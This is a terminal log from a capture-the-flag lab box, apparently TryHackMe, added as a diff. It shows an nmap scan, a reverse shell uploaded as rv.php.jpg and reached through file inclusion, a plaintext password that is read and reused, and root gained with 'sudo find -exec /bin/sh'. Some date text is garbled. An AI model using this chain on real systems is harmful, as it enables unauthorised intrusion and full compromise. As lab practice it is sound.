@@ -1,0 +1,99 @@
+root@kali:~# nmap -A -p- 192.168.43.50
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:55 CEST
+Nmap scan report for 192.168.43.50
+Host is up (0.00088s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                       
+|_http-title: Site doesn't have a title (text/html).                                                               
+MAC Address: 08:00:27:4E:B3:32 (Oracle VirtualBox virtual NIC)                                                     
+Device type: general purpose                                                                                       
+Running: Linux 4.X|5.X                                                                                             
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                    
+OS details: Linux 4.15 - 5.6                                                                                       
+Network Distance: 1 hop                                                                                            
+                                                                                                                   
+TRACEROUTE                                                                                                         
+HOP RTT     ADDRESS                                                                                                
+1   0.88 ms 192.168.43.50                                                                                          
+                                                                                                                   
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .              
+Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds  
+
+
+Reverse Shell in rv.php.jpg
+then LFI to file uploaded
+
+
+
+www-data@bassam-aziz:/var/www/html$ ls -la
+ls -la
+total 28
+drwxr-xr-x 4 root root 4096 ما� 26  2020 .
+drwxr-xr-x 3 root root 4096 ما� 26  2020 ..
+-rw-r--r-- 1 root root  163 ما� 26  2020 index.html
+-rw-r--r-- 1 root root  287 ما� 26  2020 language.php
+drwxr-xr-x 2 root root 4096 نو�  4 10:52 supersecret-for-aziz
+-rw-r--r-- 1 root root  747 ما� 26  2020 upload.php
+drwxrwxrwx 2 root root 4096 أب� 15 21:30 uploads
+www-data@bassam-aziz:/var/www/html$ 
+
+www-data@bassam-aziz:/var/www/html$ cd supersecret-for-aziz 
+cd supersecret-for-aziz
+www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ ls -la
+ls -la
+total 12
+drwxr-xr-x 2 root root 4096 نو�  4 10:52 .
+drwxr-xr-x 4 root root 4096 ما� 26  2020 ..
+-rw-r--r-- 1 root root   15 نو�  4 10:52 bassam-pass.txt
+www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ 
+
+www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ cat bassam-pass.txt
+cat bassam-pass.txt
+Password123!@#
+
+
+bassam@bassam-aziz:~$ cat user.txt
+cat user.txt
+THM{Bassam-Is-Better_Than-KIRA}
+
+
+
+bassam@bassam-aziz:~$ sudo -l
+sudo -l
+[sudo] password for bassam: Password123!@#
+
+Matching Defaults entries for bassam on bassam-aziz:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bassam may run the following commands on bassam-aziz:
+    (ALL : ALL) /usr/bin/find
+
+bassam@bassam-aziz:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
+sudo /usr/bin/find . -exec /bin/sh \; -quit
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls -la
+ls -la
+total 36
+drwx------  4 root root 4096 نوفمب  4 10:59 .
+drwxr-xr-x 24 root root 4096 مارس  26  2020 ..
+-rw-r--r--  1 root root 3106 أبريل  9  2018 .bashrc
+drwx------  2 root root 4096 فبراي  3  2020 .cache
+-rw-r--r--  1 root root   43 نوفمب  4 10:59 flag.txt
+-rw-r--r--  1 root root 1024 نوفمب  4 10:58 .fl.swp
+drwxr-xr-x  3 root root 4096 مارس  26  2020 .local
+-rw-r--r--  1 root root  148 أغسطس 17  2015 .profile
+-rw-r-----  1 root root    5 أبريل 15 20:51 .vboxclient-display-svga.pid
+# cat flag.txt
+cat flag.txt
+THM{root-Is_Better-Than_All-of-THEM-31337}
+
+
+
+
